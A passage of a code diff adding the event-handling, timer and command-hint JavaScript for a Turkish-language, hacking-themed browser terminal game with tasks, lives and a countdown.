+          nextTaskDiv.className = 'task-container';
+          terminal.appendChild(nextTaskDiv);
+
+          if (görevIndex === 3) {
+            hızKatı = 2;
+            const warningDiv = document.createElement('div');
+            warningDiv.innerHTML = '>> Sistem güvenliği güçleniyor! Zaman iki kat hızlanıyor! ⏱';
+            warningDiv.className = 'warning-text';
+            terminal.appendChild(warningDiv);
+          }
+        } else {
+          const completeDiv = document.createElement('div');
+          completeDiv.innerHTML = '>> Tüm görevler başarıyla tamamlandı. Sistem kontrolü sağlanıyor...<br>> [exit] yazarsan sistemden çıkış yapılır.';
+          completeDiv.className = 'success-text';
+          terminal.appendChild(completeDiv);
+        }
+        updateTaskStatus();
+      } else if (komut in extraKomutlar) {
+        const yanıt = typeof extraKomutlar[komut] === "function" ? extraKomutlar[komut]() : extraKomutlar[komut];
+        const aiDiv = document.createElement('div');
+        aiDiv.innerHTML = `AI >> ${yanıt}`;
+        aiDiv.className = 'normal-text';
+        terminal.appendChild(aiDiv);
+      } else {
+        can--;
+        güncelleCan();
+        if (can <= 0) {
+          maviEkran();
+          input.disabled = true;
+          return;
+        }
+        // Yapay zeka yardımı
+        const aiYanit = aiYardimci(komut);
+        const aiDiv = document.createElement('div');
+        aiDiv.innerHTML = aiYanit;
+        aiDiv.className = 'normal-text';
+        terminal.appendChild(aiDiv);
+
+        // Hata mesajını ve kalan veriyi göster
+        const errorDiv = document.createElement('div');
+        errorDiv.innerHTML = `Veri sızdırıldı.<br>Kalan veri: ${can}`;
+        errorDiv.className = 'error-text';
+        terminal.appendChild(errorDiv);
+      }
+      terminal.scrollTop = terminal.scrollHeight;
+    } else if (e.key === "ArrowUp") {
+      e.preventDefault();
+      if (commandHistoryIndex < commandHistoryList.length - 1) {
+        commandHistoryIndex++;
+        input.value = commandHistoryList[commandHistoryIndex];
+      }
+    } else if (e.key === "ArrowDown") {
+      e.preventDefault();
+      if (commandHistoryIndex > 0) {
+        commandHistoryIndex--;
+        input.value = commandHistoryList[commandHistoryIndex];
+      } else {
+        commandHistoryIndex = -1;
+        input.value = "";
+      }
+    } else if (e.key === "Tab") {
+      e.preventDefault();
+      const value = input.value.toLowerCase();
+      const matches = Object.keys(commandHints)
+        .filter(cmd => cmd.toLowerCase().startsWith(value));
+      
+      if (matches.length === 1) {
+        input.value = matches[0];
+      } else if (matches.length > 1) {
+        showCommandHints(input);
+      }
+    }
+  });
+
+  setInterval(() => {
+    kalanSaniye -= hızKatı;
+    if (kalanSaniye <= 0) {
+      timerEl.textContent = "SÜRE BİTTİ";
+      terminal.innerHTML += "\n\n>> [!] Süre doldu. Görev başarısız.";
+      input.disabled = true;
+      return;
+    }
+
+    explosion.style.display = kalanSaniye <= 10 ? 'block' : 'none';
+
+    const dk = String(Math.floor(kalanSaniye / 60)).padStart(2, '0');
+    const sn = String(kalanSaniye % 60).padStart(2, '0');
+    timerEl.textContent = `${dk}:${sn}`;
+
+    const oran = kalanSaniye / (10 * 60);
+    progressBar.style.width = `${oran * 100}%`;
+    if (oran < 0.2) {
+      progressBar.style.background = "red";
+      timerEl.style.color = "red";
+    } else if (oran < 0.5) {
+      progressBar.style.background = "yellow";
+      timerEl.style.color = "yellow";
+    } else {
+      progressBar.style.background = "limegreen";
+      timerEl.style.color = "#00FF00";
+    }
+  }, 1000);
+
+  // Görev durumu güncelleme
+  function updateTaskStatus() {
+    const progress = (görevIndex / görevler.length) * 100;
+    document.querySelector('.progress-bar-fill').style.width = `${progress}%`;
+    document.querySelector('.current-task').textContent = `Görev ${görevIndex + 1}/${görevler.length}`;
+  }
+
+  // Komut ipuçlarını göster
+  function showCommandHints(input) {
+    const hintsEl = document.getElementById('commandHints');
+    const value = input.value.toLowerCase();
+    
+    if (value.length < 2) {
+      hintsEl.classList.remove('visible');
+      return;
+    }
+
+    const matches = Object.entries(commandHints)
+      .filter(([cmd, hint]) => cmd.toLowerCase().includes(value))
+      .map(([cmd, hint]) => `<div class="hint-item" data-cmd="${cmd}">${cmd} - ${hint}</div>`)
+      .join('');
+
+    if (matches) {
+      hintsEl.innerHTML = matches;
+      hintsEl.classList.add('visible');
+    } else {
+      hintsEl.classList.remove('visible');
+    }
+  }
+
+  // Event Listeners
+  input.addEventListener('input', (e) => {
+    showCommandHints(e.target);
+  });
+
+  document.getElementById('commandHints').addEventListener('click', (e) => {
+    if (e.target.classList.contains('hint-item')) {
+      input.value = e.target.dataset.cmd;
+      document.getElementById('commandHints').classList.remove('visible');
+    }
+  });
+});
+</script>
+</body>
+</html>
